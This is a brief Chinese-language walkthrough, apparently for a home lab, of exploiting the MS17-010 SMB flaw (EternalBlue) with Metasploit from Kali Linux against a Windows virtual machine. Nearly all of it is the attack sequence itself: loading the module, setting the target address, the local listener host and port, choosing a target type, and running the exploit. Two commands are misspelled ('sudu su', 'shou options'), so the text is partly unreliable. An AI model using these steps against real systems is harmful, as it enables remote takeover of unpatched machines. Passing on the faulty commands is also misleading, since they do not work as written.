Kali Linux 系统虚拟机文件：从网上找。
从MSDN找iso映像文件：作为靶机。
进入终端：右击点 Open Terminal Here;
打开ROOT权限：sudu su ，回车后输密码
打开msf工具： msfconsole ;
找到SMB漏洞 ： search ms17_010
使用 “永恒之蓝（eternalblue）” ： use 0
查看设置项：shou options 或 options
设置攻击目标 : set RHOSTS **.**.**.**
本地监听地址： LHOST
监听端口：LPORT
漏洞系统类型 show targets
设置 set target *
攻击目标 run
